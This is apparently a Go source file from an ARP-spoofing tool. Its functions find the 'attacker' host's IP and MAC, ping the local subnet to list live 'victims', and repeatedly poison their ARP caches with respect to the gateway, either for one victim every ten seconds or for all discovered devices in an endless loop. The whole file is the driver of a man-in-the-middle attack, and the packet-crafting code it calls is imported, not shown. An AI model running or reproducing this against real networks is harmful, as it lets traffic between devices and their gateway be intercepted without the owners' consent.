package app

import (
	"arp_spoof/arp"
	"arp_spoof/network"
	"errors"
	"net"
	"time"

	"github.com/google/gopacket/pcap"
)

var (
	ErrIncorrectIPFormat = errors.New("err: incorrect IP format")
)

const (
	TIMEOUT = time.Second * 10
)

func MultipleArpSpoof(gatewayIPStr, netInterface string, deviceHandle *pcap.Handle) error {
	gatewayIP := net.ParseIP(gatewayIPStr)
	if gatewayIP == nil {
		return ErrIncorrectIPFormat
	}

	attacker, err := getAttackerInfo(netInterface)
	if err != nil {
		return err
	}

	victims := getLiveDevices(attacker.IP.To4())

	for {
		if err := arp.PoisonARPCacheMultiple(gatewayIP.To4(), victims, attacker, deviceHandle); err != nil {
			return err
		}
	}
}

func getLiveDevices(attackerIP net.IP) []net.IP {
	ipRange := network.GetAllIPs(attackerIP)
	liveDevices := network.Ping(ipRange)
	return liveDevices
}

func ArpSpoof(gatewayIPStr, victimIPStr, netInterface string, deviceHandle *pcap.Handle) error {
	gatewayIP := net.ParseIP(gatewayIPStr)
	if gatewayIP == nil {
		return ErrIncorrectIPFormat
	}

	victimIP := net.ParseIP(victimIPStr)
	if victimIP == nil {
		return ErrIncorrectIPFormat
	}

	attacker, err := getAttackerInfo(netInterface)
	if err != nil {
		return err
	}

	devices, err := network.MapIPstoMAC([]net.IP{gatewayIP, victimIP})
	if err != nil {
		return err
	}

	for {
		if err := arp.PoisonARPCache(devices, attacker, deviceHandle); err != nil {
			return err
		}

		time.Sleep(TIMEOUT)
	}
}

func getAttackerInfo(netInterface string) (*network.DeviceInfo, error) {
	attackerIP, err := network.GetAttackerIP()
	if err != nil {
		return nil, err
	}

	attackerMAC, err := network.GetMAC(netInterface)
	if err != nil {
		return nil, err
	}

	return network.NewDeviceInfo(attackerIP, attackerMAC), nil
}
